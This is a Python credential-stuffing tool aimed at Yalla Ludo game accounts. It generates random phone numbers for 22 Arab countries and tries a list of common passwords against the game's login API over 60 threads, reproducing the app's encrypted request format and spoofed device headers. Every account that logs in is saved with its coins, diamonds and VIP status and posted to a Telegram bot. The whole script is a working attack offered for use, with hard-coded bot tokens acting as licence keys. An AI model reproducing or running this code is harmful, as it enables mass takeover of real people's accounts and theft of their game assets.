# -*- coding: utf-8 -*-
import base64
import json
import hashlib
import requests
import random
import threading
import time
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from datetime import datetime, timedelta

# ==================== SYSTEM EXPIRY ====================#
EXPIRY_DATE = datetime(2026, 9, 15)
EXIT_MESSAGE = "\n تم انتهاء التفعيل |Zeus @R7_36 \n"

if datetime.now() > EXPIRY_DATE:
    print("\033[1;31m" + "="*56)
    print(EXIT_MESSAGE)
    print("="*56 + "\033[0m")
    sys.exit(1)
# ======================================================#

# ==================== ALLOWED TOKENS & CHAT IDS ====================#
ALLOWED_TOKENS = [
    "8866329769:AAFH3hqRLCagHbQABRnTdmqCKTcvh3ZJ0TA",
    "8119792351:AAFWzT5AwaAw00-sLtOjCqTktGcySWxUDC0",
    "8899078033:AAElDioe_5Bp2f7Ad5x09vxcN4pRz6JJBgc",
    "7639417267:AAECuH6dqWo2t4O2hYsi-B30O0KZbZXXpCc"
]

ALLOWED_CHAT_IDS = [
    "7519297075",
    "6319093542",
    "6312736915",
    "7709439366"
]
# ================================================================#

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    class Dummy:
        pass
    Fore = Back = Style = Dummy()
    Fore.GREEN = Fore.RED = Fore.YELLOW = Fore.CYAN = Fore.MAGENTA = ''
    Back.GREEN = Back.RED = Back.YELLOW = Back.WHITE = Back.BLACK = ''
    Style.BRIGHT = ''

try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    from cfonts import render, say

# ==================== COLORS ====================#
G = "\x1b[38;5;93m"
R = "\x1b[38;5;196m"
W = "\x1b[38;5;15m"
Y = "\x1b[38;5;226m"
PINK = "\x1b[38;5;198m"
GREEN = "\x1b[38;5;46m"
YELLOW = "\x1b[38;5;226m"
RED = "\x1b[38;5;196m"
P = "\x1b[38;5;198m"
xp = f"{R}<[{W}●{R}]>{W}"
xpxx = f"{R}>{W}>{R}>{W}"
xlinex = (f"{R}━"*56)

# ==================== MOVING LOGO ====================#
def animate_logo():
    frames = [
        "ㅂㅈ둎ㄴ묘ㅑㅏㅍㅌㄷㄴ퍼ㅑㅕㅐ멋넛냣아ㅛ아요ㅏㅛ",
        "아ㅛ잏틒ㅋㄹ닛뎌내ㅛㅑㅅ냣내ㅛㅇ",
        "ㄷ벼냣냣냣낳타핰효오로러처러ㅕ려려려러ㅓ퍼처러",
        "추하허ㅗ러러ㅓ처류",
        "ㅛㄱㅈㄴ포ㅑㅅㅈㅂ뎌ㅐㅐㅏㅠㅌㄴㅈ"
    ]
    for frame in frames:
        sys.stdout.write(f"\r{R}{frame}{W}")
        sys.stdout.flush()
        time.sleep(0.3)
    sys.stdout.write("\r" + " " * 50 + "\r")

# ==================== LOGO ====================#
logo = f"""
{P}●─────━Zeus─────━●
{R}╱╱╭━━━┳━┳━━━┳━╮
{P}╭━┫╭━╮┃━┫╭━╮┃━┫
{R}┃╋┣╯╭╯┣━┣╯╭╯┣━┃
{P}┃╭╯╱┃╭┻━╯╱┃╭┻━╯
{R}╰╯╱╱┃┃╱╱╱╱┃┃

{W}  ×─> {W}━━━━━━━{P}━━━━━━━━━━{W}━━━━━━━━━━━━{W}━━━━━{P}Zeus━━━━━━{W}━━━━━ <─×"""

# ==================== COUNTRIES DATA ====================#
COUNTRIES = {
    "1": {"name": "Iraq", "code": "964", "prefix": ["0750", "0770", "0780"]},
    "2": {"name": "Saudi Arabia", "code": "966", "prefix": ["050", "053", "054", "055", "056", "058"]},
    "3": {"name": "Egypt", "code": "20", "prefix": ["010", "011", "012", "015", "016", "017"]},
    "4": {"name": "UAE", "code": "971", "prefix": ["050", "052", "054", "055", "056", "058"]},
    "5": {"name": "Jordan", "code": "962", "prefix": ["070", "071", "072", "077", "078", "079"]},
    "6": {"name": "Lebanon", "code": "961", "prefix": ["030", "031", "032", "033", "034", "035"]},
    "7": {"name": "Syria", "code": "963", "prefix": ["090", "091", "092", "093", "094", "095"]},
    "8": {"name": "Palestine", "code": "970", "prefix": ["050", "051", "052", "053", "054", "055"]},
    "9": {"name": "Kuwait", "code": "965", "prefix": ["500", "503", "505", "506", "507", "509"]},
    "10": {"name": "Qatar", "code": "974", "prefix": ["330", "331", "332", "333", "334", "335"]},
    "11": {"name": "Bahrain", "code": "973", "prefix": ["310", "311", "312", "313", "314", "315"]},
    "12": {"name": "Oman", "code": "968", "prefix": ["710", "712", "714", "715", "716", "718"]},
    "13": {"name": "Yemen", "code": "967", "prefix": ["700", "701", "702", "703", "704", "705"]},
    "14": {"name": "Morocco", "code": "212", "prefix": ["600", "601", "602", "603", "604", "605"]},
    "15": {"name": "Algeria", "code": "213", "prefix": ["055", "056", "066", "067", "077", "079"]},
    "16": {"name": "Tunisia", "code": "216", "prefix": ["200", "201", "202", "203", "204", "205"]},
    "17": {"name": "Libya", "code": "218", "prefix": ["910", "911", "912", "913", "914", "915"]},
    "18": {"name": "Sudan", "code": "249", "prefix": ["090", "091", "092", "093", "094", "095"]},
    "19": {"name": "Somalia", "code": "252", "prefix": ["060", "061", "062", "063", "064", "065"]},
    "20": {"name": "Djibouti", "code": "253", "prefix": ["770", "771", "772", "773", "774", "775"]},
    "21": {"name": "Mauritania", "code": "222", "prefix": ["410", "411", "412", "413", "414", "415"]},
    "22": {"name": "Comoros", "code": "269", "prefix": ["320", "321", "322", "323", "324", "325"]}
}

XOR_KEY = bytes.fromhex("3336613636313637666532623236633033363933663061643936653462613439")

def xor_encrypt(data):
    return bytes(value ^ XOR_KEY[index % len(XOR_KEY)] for index, value in enumerate(data))

def xor_decrypt(data):
    return bytes(value ^ XOR_KEY[index % len(XOR_KEY)] for index, value in enumerate(data))

def build_payload(payload_dict):
    json_bytes = json.dumps(payload_dict, separators=(",", ":")).encode("utf-8")
    encrypted = xor_encrypt(json_bytes)
    return {"paramJsonString": base64.b64encode(encrypted).decode("utf-8")}

def decode_param(param_b64):
    decoded = base64.b64decode(param_b64)
    decrypted = xor_decrypt(decoded)
    return json.loads(decrypted.decode("utf-8"))

def get_md5(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest().upper()

def print_logo():
    try:
        output = render('Y A L L A', colors=['red', 'red'], align='center')
        print(output)
    except:
        pass

# ==================== COUNTRY SELECTION ====================#
def show_countries():
    print(f"\n{R}{'='*50}{W}")
    for key, country in COUNTRIES.items():
        prefixes = " | ".join(country["prefix"])
        print(f"{R}[{W}{key}{R}] {country['name']} {R}➜ {W}{country['code']} {R}➜ {W}{prefixes}")
    print(f"{R}{'='*50}{W}\n")

def select_country():
    show_countries()
    while True:
        choice = input(f"{xp} Select country number (1-22) {xpxx} ").strip()
        if choice in COUNTRIES:
            return COUNTRIES[choice]
        print(f"{xp} {R}Invalid choice! Try again.{W}")

DOMAINS = [
    "httpgateway.carrstuv.com",
    "httpgateway.foodjkl.com",
    "httpgateway.planecde.com",
]

BASE_URL = "https://{domain}/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"

PAYLOAD_TEMPLATE = {
    "mobile": "",
    "areaCode": "966",
    "password": "",
    "languageId": 2,
    "nationalityId": "1",
    "hostConfig": [
        {"bizType": 5000, "countryCode": "IQ", "hostUrl": "https://api-shumeng.yalla.games", "type": 2, "version": 4},
        {"bizType": 5001, "countryCode": "", "hostUrl": "ws://firebreak.yalla.games", "type": 1, "version": 1},
        {"bizType": 5002, "countryCode": "IQ", "hostUrl": "https://jwt.sailfishx.live", "type": 1000, "version": 0},
        {"bizType": 5003, "countryCode": "IQ", "hostUrl": "https://jwt.sailfishx.live", "type": 1000, "version": 0},
        {"bizType": 5004, "countryCode": "IQ", "hostUrl": "https://httpgateway.penabcd.com", "type": 2, "version": 6},
        {"bizType": 5005, "countryCode": "IQ", "hostUrl": "https://api.lightkvd.com", "type": 2, "version": 4},
        {"bizType": 5006, "countryCode": "IQ", "hostUrl": "https://upload-as0.qiniup.com", "type": 2, "version": 5},
        {"bizType": 5007, "countryCode": "", "hostUrl": "https://www.yallapay.live,https://www.payfun.live,https://pre-www.yallapay.live,https://activity.funcdeg.com,https://activity.carrstuv.com", "type": 1, "version": 11},
        {"bizType": 2001, "countryCode": "", "hostUrl": "https://roomapi.yalla.games,https://roomapi.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2002, "countryCode": "", "hostUrl": "https://roomclog.yalla.games,https://roomclog.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2003, "countryCode": "", "hostUrl": "https://roommoment.yalla.games,https://roommoment.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2004, "countryCode": "", "hostUrl": "https://www.yallaludo.com", "type": 1, "version": 0},
        {"bizType": 2005, "countryCode": "", "hostUrl": "https://file.yalla.Live", "type": 1, "version": 0},
        {"bizType": 2006, "countryCode": "IQ", "hostUrl": "https://nitrogen.foodjkl.com,https://nitrogen.yalla.games,https://nitrogen.carrstuv.com", "type": 2, "version": 19},
        {"bizType": 2007, "countryCode": "IQ", "hostUrl": "wss://room.foodjkl.com,wss://room.yalla.games,wss://room.carrstuv.com", "type": 2, "version": 22},
        {"bizType": 2008, "countryCode": "IQ", "hostUrl": "wss://roomgame.yalla.games,wss://roomgame.foodjkl.com,wss://roomgame.carrstuv.com", "type": 2, "version": 18},
        {"bizType": 4000, "countryCode": "IQ", "hostUrl": "ws://ludo01.carrstuv.com,wss://new-ludo.carrstuv.com", "type": 2, "version": 84},
        {"bizType": 4001, "countryCode": "IQ", "hostUrl": "ws://domino01.carrstuv.com,wss://new-domino.carrstuv.com", "type": 2, "version": 83},
        {"bizType": 4003, "countryCode": "IQ", "hostUrl": "wss://duelludo.carrstuv.com", "type": 2, "version": 20},
        {"bizType": 4004, "countryCode": "IQ", "hostUrl": "wss://jungleludo.carrstuv.com", "type": 2, "version": 20},
        {"bizType": 1000, "countryCode": "IQ", "hostUrl": "https://account.foodjkl.com,https://account.yalla.games,https://account.carrstuv.com", "type": 2, "version": 19},
        {"bizType": 1001, "countryCode": "IQ", "hostUrl": "https://pay.foodjkl.com,https://pay.yalla.games,https://pay.carrstuv.com", "type": 2, "version": 17},
        {"bizType": 1002, "countryCode": "IQ", "hostUrl": "https://mail.foodjkl.com,https://mail.yalla.games,https://mail.carrstuv.com", "type": 2, "version": 18},
        {"bizType": 1003, "countryCode": "IQ", "hostUrl": "https://clog.foodjkl.com,https://clog.carrstuv.com,https://clog.yalla.games", "type": 2, "version": 17},
        {"bizType": 1004, "countryCode": "IQ", "hostUrl": "https://activity.carrstuv.com,https://activity.yalla.games,https://activity.foodjkl.com", "type": 2, "version": 17},
        {"bizType": 1005, "countryCode": "IQ", "hostUrl": "https://usuallyactivity.carrstuv.com,https://usuallyactivity.yalla.games,https://usuallyactivity.foodjkl.com", "type": 2, "version": 17},
        {"bizType": 1006, "countryCode": "IQ", "hostUrl": "https://httpgateway.foodjkl.com,https://httpgateway.planecde.com,https://httpgateway.carrstuv.com", "type": 2, "version": 20},
        {"bizType": 1007, "countryCode": "IQ", "hostUrl": "wss://tyr.foodjkl.com,wss://tyr.carrstuv.com,wss://tyr.yalla.games", "type": 2, "version": 18},
        {"bizType": 1008, "countryCode": "IQ", "hostUrl": "wss://hall.carrstuv.com,wss://hall.foodjkl.com,wss://hall.yallaludo.com", "type": 2, "version": 38},
        {"bizType": 6000, "countryCode": "", "hostUrl": "https://broadcast-host.ylconfig.com", "type": 1, "version": 0},
        {"bizType": 3000, "countryCode": "IQ", "hostUrl": "https://file.carrstuv.com", "type": 2, "version": 27},
        {"bizType": 3001, "countryCode": "IQ", "hostUrl": "https://dtchat.yalla.games,https://dtchat.carrstuv.com,https://dtchat.foodjkl.com", "type": 2, "version": 18},
        {"bizType": 3002, "countryCode": "IQ", "hostUrl": "https://activity.foodjkl.com,https://activity.carrstuv.com,https://activity.yalla.games", "type": 2, "version": 17},
        {"bizType": 3003, "countryCode": "IQ", "hostUrl": "https://dtslave.foodjkl.com,https://dtslave.yalla.games,https://dtslave.carrstuv.com", "type": 2, "version": 18},
        {"bizType": 3004, "countryCode": "IQ", "hostUrl": "wss://dtslave.yalla.games,wss://dtslave.carrstuv.com,wss://dtslave.foodjkl.com", "type": 2, "version": 17}
    ],
    "simCountry": "SA",
    "version": "1.5.1.0",
    "deviceId": "f8a37276-bfc9-4379-a0e7-638a4dd6dd15",
    "deviceName": "realme RMX3085",
    "deviceType": 2,
    "downloadChannelId": 1,
    "shuMengId": "DUZo2o2od9mmkAoUBfsElGX4fDoiW6Xnt3gd",
    "nonce": "-567746773_8d4bca46-10c1-4ece-b94b-b11b848318c7",
    "plateType": 0,
    "phoneModel": "RMX3085",
    "X-Phone-Country": "SA",
    "X-Sim-Country": "SA",
    "AndroidId": "ff6c831833c83558a4e7eac17207bd59_e38db79eb11f7352",
    "IsSubpackages": 0,
    "appType": 0,
}

HEADERS = {
    'User-Agent': "YallaLudo-1.5.0.0-(Build 1050003)-Android 32",
    'Accept-Encoding': 'gzip',
    'Content-Type': 'application/json',
    'baggage': 'service.name=ludo',
    'userid': '0',
    'x-app-id': 'ludo',
    'x-baggage': "eyJ0aW1lU3BhbiI6IjE3ODc3OTk0NjIzNzgiLCJ2ZXJzaW9uIjoiMS41LjEuMCIsImRldmljZUlkIjoiNzdjYzY5MjEtMGFlYS00MDNjLWExYmMtNGU4YTQ0ZTA3Y2M5IiwiZGV2aWNlTmFtZSI6IlNhbXN1bmcgU00tQTE1NkUiLCJkZXZpY2VUeXBlIjoyLCJkb3dubG9hZENoYW5uZWxJZCI6MSwic2h1TWVuZ0lkIjoiRFVXRlVHZ2VoQmxod1dHcWZqZnBGRjFQR21fZ0RQWE5GQ2c5Iiwibm9uY2UiOiItMTg3NDg4ODQ5Ml9lODY2ZmVhMy1kZGIzLTQ4NmItOWQzNy0zNWU4MDllOTY4NDQiLCJwbGF0ZVR5cGUiOjAsIkxhbmd1YWdlSWQiOjEsInBob25lTW9kZWwiOiJTTS1BMTU2RSIsIlgtUGhvbmUtQ291bnRyeSI6IlVTIiwiWC1TaW0tQ291bnRyeSI6IiIsIkFuZHJvaWRJZCI6IjYzOWM3OWQ1YThmNTJmNzMyODMzYTgzMGUyNzU4MWM4X2ZkYWI3YWNjOWUyNjUzMDMiLCJhcHBUeXBlIjowfQ==",
    'x-access-token': '',
    'x-timestamp': '1787799468978',
    'versionstring': '1.5.1.0',
    'x-sign': "2.0_2_1d410e76e0bf509c89fc0cd7acbd064304afd623b4a9eec0de1d22de368cf1ec",
    'x-hera': "1e76344f70ea4d3b9a6648da635d6fe7",
    'x-time': "1787799468978",
    'x-medusa': "il4wWlpuvaJRqDdsUG1DJeteUFQ1EncU5ZSrc5U0T3IPCOdhurefJk9NMa8VUHir5mkhJUpe6sS9cvWRC0b2yaenOk/y0ThxgcABHM/cZyk=",
    'content-type': 'application/json; charset=utf-8'
}

PASSWORDS = [
    'Aa123456',
    'As123456',
    'Aa123123',
    'Aa1234567890',
    'Aa112233',
    'Aa1234567',
    'Aa12345678',
    'Aa123456789',
  
]

# ==================== CHECK TOKEN & CHAT ID ====================#
def validate_credentials(token, chat_id):
    if token not in ALLOWED_TOKENS:
        print(f"\n{R}═"*56)
        print(f"{R}[❌] TOKEN غير مصرح به!")
        print(f"{R}═"*56)
        return False
    if chat_id not in ALLOWED_CHAT_IDS:
        print(f"\n{R}═"*56)
        print(f"{R}[❌] CHAT ID غير مصرح به!")
        print(f"{R}═"*56)
        return False
    return True
# ================================================================#

BOT_TOKEN = input(f"{xp} TOKEN {xpxx} ")
CHAT_ID = input(f"{xp} ID {xpxx} ")
print(xlinex)

# التحقق من الصلاحيات
if not validate_credentials(BOT_TOKEN, CHAT_ID):
    sys.exit(1)

# ==================== SELECT COUNTRY ====================#
selected_country = select_country()
COUNTRY_CODE = selected_country["code"]
PREFIXES = selected_country["prefix"]
print(f"{xp} Selected: {R}{selected_country['name']}{W} | Code: {R}{COUNTRY_CODE}{W} | Prefixes: {R}{', '.join(PREFIXES)}{W}")
print(xlinex)

# ==================== VARIABLES ====================#
results = []
stats = defaultdict(int)
lock = threading.Lock()
stop_flag = False
valid_accounts_file = "Yalla_valid_accounts.txt"
total_checked = 0
hit_accounts = []

def send_telegram(phone, pwd, extra_info=""):
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        text = f"""YALLA LUDO

ID    ➜ {extra_info.get('id', 'N/A')}
Name   ➜ {extra_info.get('name', 'N/A')}
Email  ➡ {phone}
Pass   ➜ {pwd}
Level  ➜ {extra_info.get('level', 'N/A')}
Coins  ➜ {extra_info.get('coins', 'N/A')}
Diamond  ➜ {extra_info.get('diamond', 'N/A')}
Exp     ➜ {extra_info.get('exp', 'N/A')}
Vip      ➜ {extra_info.get('vip', 'N/A')}
Wins     ➜ {extra_info.get('wins', 'N/A')}
Losses   ➜ {extra_info.get('losses', 'N/A')}

Channel ➡ @R7Aih1
  PY: @R7_36"""
        requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=5)
    except Exception:
        pass

def save_valid_account(phone, pwd, extra_info=""):
    try:
        with open(valid_accounts_file, "a", encoding="utf-8") as f:
            f.write(f"YALLA LUDO\n")
            f.write(f"ID     {extra_info.get('id', 'N/A')}\n")
            f.write(f"Name    {extra_info.get('name', 'N/A')}\n")
            f.write(f"Email  {phone}\n")
            f.write(f"Pass    {pwd}\n")
            f.write(f"Level   {extra_info.get('level', 'N/A')}\n")
            f.write(f"Coins   {extra_info.get('coins', 'N/A')}\n")
            f.write(f"Diamond  {extra_info.get('diamond', 'N/A')}\n")
            f.write(f"Exp    {extra_info.get('exp', 'N/A')}\n")
            f.write(f"Vip     {extra_info.get('vip', 'N/A')}\n")
            f.write(f"Wins     {extra_info.get('wins', 'N/A')}\n")
            f.write(f"Losses  {extra_info.get('losses', 'N/A')}\n")
            f.write("=" * 50 + "\n")
    except Exception:
        pass

def check_number(mobile):
    global results, stats, total_checked, hit_accounts, stop_flag
    if stop_flag:
        return

    payload_dict = PAYLOAD_TEMPLATE.copy()
    payload_dict["mobile"] = mobile.lstrip("0")
    payload_dict["areaCode"] = COUNTRY_CODE
    
    for pwd in PASSWORDS:
        if stop_flag:
            return
        
        payload_dict["password"] = get_md5(pwd)

        data = None
        for domain in DOMAINS:
            try:
                enc_payload = build_payload(payload_dict)
                resp = requests.post(BASE_URL.format(domain=domain), json=enc_payload, headers=HEADERS, timeout=10)
                if resp.status_code != 200:
                    continue
                resp_data = resp.json()
                if "paramJsonString" in resp_data and isinstance(resp_data["paramJsonString"], str):
                    try:
                        data = decode_param(resp_data["paramJsonString"])
                    except Exception:
                        data = resp_data
                else:
                    data = resp_data
                break
            except Exception:
                continue

        if data is None:
            continue

        status = data.get("status", -1)

        if status == 0:
            acct = data.get("data", {})
            name = acct.get("name", "N/A")
            uid = acct.get("id", "N/A")
            info = {
                "id": uid,
                "name": name,
                "level": acct.get("level", "N/A"),
                "coins": acct.get("coins", "N/A"),
                "diamond": acct.get("diamond", "N/A"),
                "exp": acct.get("exp", "N/A"),
                "vip": acct.get("vip", "N/A"),
                "wins": acct.get("wins", "N/A"),
                "losses": acct.get("losses", "N/A"),
            }
            with lock:
                results.append("good")
                stats['good'] += 1
                stats['total'] += 1
                total_checked += 1
                hit_accounts.append({
                    "phone": mobile,
                    "password": pwd,
                    "name": name,
                    "id": uid
                })
            send_telegram(mobile, pwd, info)
            save_valid_account(mobile, pwd, info)
            return

        elif status == 151:
            continue

        elif status == 182 or status == 1001:
            with lock:
                results.append("notreg")
                stats['not_registered'] += 1
                stats['total'] += 1
                total_checked += 1
            return

        else:
            continue

    with lock:
        results.append("wrong")
        stats['wrong_pass'] += 1
        stats['total'] += 1
        total_checked += 1

def generate_mobile():
    prefix = random.choice(PREFIXES)
    number = ''.join([str(random.randint(0, 9)) for _ in range(7)])
    return prefix + number

def print_dashboard():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(logo)
    
    print(f"\n{xp} COUNTRY    {xpxx} {R}{selected_country['name']}{W}")
    print(f"{xp} HIT     {xpxx} {R}{stats['good']}{W}    WRONG     {xpxx} {R}{stats['wrong_pass']}{W}    NOTREG     {xpxx} {R}{stats['not_registered']}{W}")
    print(xlinex)
    print(f"{xp} HIT ACCOUNTS")
    if hit_accounts:
        for acc in hit_accounts[-10:]:
            print(f"{xp} {PINK}│{W} {PINK}{acc['phone']}{W} {PINK}│{W}  {YELLOW}{acc['password']}{W}  {PINK}│{W}  {GREEN}{acc['id']}{W}")
    else:
        print(f"{xp} No hits yet...")
    print(xlinex)
    print(f"{xp} TOTAL     {xpxx} {W}{stats['total']}")
    print(f"{xp} STATU:    {xpxx} {R}SCANNING...{W}")
    print(xlinex)

def dashboard_loop():
    while not stop_flag:
        print_dashboard()
        time.sleep(0.5)

def main():
    global stop_flag

    # تشغيل اللوقو المتحرك
    animate_logo()
    time.sleep(0.5)
    os.system('cls' if os.name == 'nt' else 'clear')
    print(logo)
    time.sleep(1)

    THREADS = 60

    dashboard_thread = threading.Thread(target=dashboard_loop, daemon=True)
    dashboard_thread.start()

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = []
        try:
            while not stop_flag:
                mobile = generate_mobile()
                futures.append(executor.submit(check_number, mobile))
                
                if len(futures) > 1000:
                    for f in as_completed(futures[:500]):
                        pass
                    futures = futures[500:]
                    
        except KeyboardInterrupt:
            print("\nStopped.")
            stop_flag = True
        
        for f in as_completed(futures):
            pass
    
    print("\033[1;31m" + "="*56)
    print(EXIT_MESSAGE)
    print("="*56 + "\033[0m")
    
    print(f"\nDone. HIT: {stats['good']}, Wrong: {stats['wrong_pass']}, NotReg: {stats['not_registered']}, Error: {stats['error']}")
    print(f"Valid accounts saved to: {valid_accounts_file}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped.")
